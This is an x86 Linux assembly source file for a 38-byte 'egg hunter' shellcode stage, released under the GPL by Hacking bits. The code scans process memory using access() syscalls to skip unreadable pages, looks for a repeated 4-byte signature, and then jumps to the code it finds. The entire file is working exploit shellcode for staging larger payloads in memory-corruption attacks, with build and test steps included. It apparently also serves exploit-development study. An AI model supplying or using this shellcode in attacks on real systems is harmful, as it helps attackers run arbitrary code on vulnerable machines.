; Egg Hunter - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   egg_hunter
;
;   * 38 bytes
;   * null-free if the signature is
;
;
;   # nasm -f elf32 egg_hunter.asm
;   # ld -m elf_i386 egg_hunter.o -o egg_hunter
;
;   Testing
;   # ./egg_hunter


global _start

section .text

_start:
	; setting the registers
	cld			; clear the direction flag (DF) to use scasd correctly
	xor ecx, ecx
	mul ecx
alignpage:
	; align page
	or dx, 0xfff 		; is the same as "add dx, 4095" (PAGE_SIZE)
alignbyte:
	inc edx			; next memory offset

	; Accessing the memory offset
	; int access(const char *pathname, int mode);
	; access(memoryaddress, 0)

	push 33			; __NR_access 33
	pop eax

	lea ebx, [edx + 4]	; alignment to validate the last four bytes of the signature

				; ecx already contains 0 (F_OK)

	int 0x80		; kernel interruption


	; verifies if memory is not readable (bad address = EFAULT = 0xf2 = -14)
	; as the offset is not from a path name, access will never result 0, so we have to compare the error result with 0xf2
	cmp al, 0xf2

	; if is not, loop
	jz alignpage

	; compares the signature and increments 4 bytes in edi
	mov eax, 0x50905090	; byte reverse order
	mov edi, edx
	scasd

	; if is not equal, loop
	jnz alignbyte

	; if is equal, compares the last signature 4 bytes and increments 4 bytes in edi again
	scasd

	; if is not equal, loop
	jnz alignbyte

	; if is equal, eat the egg
	jmp edi
